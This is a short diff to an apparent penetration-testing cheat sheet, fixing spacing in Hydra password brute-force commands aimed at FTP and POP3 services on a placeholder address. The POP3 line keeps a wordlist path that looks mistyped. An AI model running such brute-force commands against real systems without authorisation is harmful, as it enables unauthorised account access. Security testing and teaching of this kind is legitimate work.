@@ -2,11 +2,11 @@
 
 ### Hydra FTP Brute Force
 
-	hydra -l USERNAME -P /usr/share/wordlistsnmap.lst-f 192.168.X.XXX ftp -V
+	hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
 
 ### Hydra POP3 Brute Force
 
-	hydra -l USERNAME -P /usr/sha/wordlistsnmap.lst-f 192.168.X.XXX pop3 -V
+	hydra -l USERNAME -P /usr/sha/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
      
 ### Hydra SMTP Brute Force
 
